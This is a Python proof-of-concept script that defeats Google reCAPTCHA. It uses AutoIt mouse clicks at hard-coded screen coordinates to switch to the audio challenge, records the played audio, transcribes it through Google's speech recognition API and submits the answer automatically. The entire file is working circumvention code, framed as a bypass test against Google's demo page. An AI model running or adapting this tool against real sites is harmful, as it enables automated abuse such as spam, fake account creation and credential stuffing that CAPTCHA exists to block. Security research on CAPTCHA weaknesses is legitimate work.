from time import sleep
import win32gui
import autoit
import speech_recognition as sr
import sounddevice as sd
import soundfile as sf

# Configuration of coordinates for PoC (will need to update these based on GUI environment)
coordinates = {'reCAPTCHA':[900, 452],
               'submit':[902, 514],
               'audio':[1002, 715],
               'play':[1076, 399],
               'input':[1023, 457],
               'verButton':[1146, 564]}

def enterInput(location, intext):
    autoit.mouse_move(location[0], location[1])
    autoit.mouse_click()
    autoit.send(intext)
    
def click(location):
    autoit.mouse_move(location[0], location[1])
    sleep(1)
    autoit.mouse_click()

# Can use this function to update coordinates
def getCursorLocation():
    input('Click Enter')
    return list(win32gui.GetCursorPos())

# Can be tested on -- https://www.google.com/recaptcha/api2/demo
# Run Bypass Test
sleep(10)
print('[+] Attempting initial CAPTCHA bypass')
print('    [+] Clicking CAPTCHA Checkbox')
click(coordinates['reCAPTCHA'])
sleep(3)
print('    [+] Changing CAPTCHA challenge to Audio')
click(coordinates['audio'])
sleep(6)
click(coordinates['play'])
print('    [+] Recording CAPTCHA audio')

# Start Recording
seconds = 5
fs = 44100  # Sample rate
myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
sd.wait()  # Wait until recording is finished
data = myrecording

# Write out audio as 24bit PCM WAV
sleep(1)
sf.write('temp.wav', data, fs, subtype='PCM_24')
r = sr.Recognizer()
inputAudio = sr.AudioFile('temp.wav')
with inputAudio as source:
    audio = r.record(source)
print('    [+] Sending audio to Google Speech Recognition API for analysis')
text = r.recognize_google(audio)
print(f'    [+] Submitting audio as -- {text}')
enterInput(coordinates['input'], text)
sleep(1)
click(coordinates['verButton'])
sleep(3)
click(coordinates['submit'])

